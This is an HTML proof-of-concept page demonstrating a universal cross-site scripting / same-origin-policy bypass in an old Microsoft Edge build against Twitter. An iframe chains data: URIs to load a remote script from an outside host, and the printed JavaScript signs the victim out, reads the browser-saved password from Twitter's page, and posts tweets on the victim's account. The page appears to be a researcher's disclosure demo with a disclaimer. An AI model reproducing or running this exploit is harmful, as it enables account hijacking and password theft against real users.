<!doctype html>
<html>
<head>
	<title>Natural Selection Evidence</title>
</head>
<body>
<div style="width:600px;text-align:center;">
This proof of concept assumes that you have a Twitter tab/window already opened. If you don't, please, <a href="https://www.twitter.com/" target="_blank">open one now</a>!
<br /><br />
The following script will tweet on your account (if you are logged in and using MS Edge)
<br />
If your password was saved by Password Manager (default behavior in Edge), then the [ Get Password ] button will reveal your real Twitter password in your screen.
<br /><br />
<b>This is for educational purposes only. Stealing a password is probably illegal in your country. DON'T DO IT.</b>


	<h2>Tweeting like Charles Darwin</h2>
	<iframe width="350" height="200" src="data:text/html,<meta http-equiv=refresh content=%220;url=data:text/html,<script src=http://unsafe.cracking.com.ar/demos/edgedatametadata/tweet-like-charlie.js>%22>"></iframe>
	<br /><br />
</div>
	This code  executes inside Twitter's blank iframe "dm-post-iframe" thanks to the data-meta-data SOP bypass<br /><br />
	<code>
		// Sign Out<br />
		parent.document.getElementById("signout-button").click();<br /><br />

		// Sign In<br />
		parent.document.querySelectorAll("[pb-role=submit]")[0].click();<br /><br />
		
		// Get Password<br />
		alert("Password: " + parent.document.querySelectorAll("[pb-role=password]")[0].value);<br /><br />
		
		// Tweet<br />
		boxTextToTweet = parent.document.getElementById("tweet-box-home-timeline");<br />
		btnPostTweet = parent.document.getElementsByClassName("btn primary-btn tweet-action tweet-btn js-tweet-btn")[0];<br /><br />
		
		boxTextToTweet.focus();<br />
		boxTextToTweet.innerHTML = taText.value;<br />
		btnPostTweet.click();<br />
	</code>
</body>
<script>
</script>
<br /><br /><br />
<br /><hr /><br />
<u>Tested on</u>: Microsoft Edge 40.15063.0.0 / EdgeHTML 15.15063
<br /><br />
<u>Explanation</u>: <a href="https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin">SOP bypass / UXSS data-meta-data in a domainless world (Edge)</a>
<br /><br />
<u>Contact</u>: <a href="https://twitter.com/magicmac2000">@magicmac2000</a>

</html>